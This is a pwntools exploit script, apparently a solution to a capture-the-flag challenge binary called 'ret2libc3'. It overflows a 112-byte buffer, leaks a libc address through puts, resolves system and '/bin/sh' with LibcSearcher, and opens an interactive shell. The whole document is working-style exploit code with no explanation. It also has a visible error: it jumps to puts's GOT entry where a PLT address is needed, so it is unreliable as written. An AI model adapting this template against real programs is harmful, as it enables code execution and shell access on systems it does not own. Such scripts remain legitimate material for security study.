from pwn import *
from LibcSearcher import LibcSearcher as search

sh=process('./ret2libc3')
elf=ELF('./ret2libc3')

__libc_start_main_addr=elf.got['__libc_start_main']
puts_addr=elf.got['puts']
main_addr=elf.symbols['_start']

payload=flat(['a'*112,puts_addr,main_addr,__libc_start_main_addr])
sh.sendlineafter('!?',payload)

get_addr=u32(sh.recv()[:4])
libc=search('__libc_start_main',get_addr)
base=get_addr-libc.dump('__libc_start_main')

system=base+libc.dump('system')
binsh=base+libc.dump('str_bin_sh')

payload=flat(['a'*112,system,0,binsh])
sh.sendline(payload)

sh.interactive()


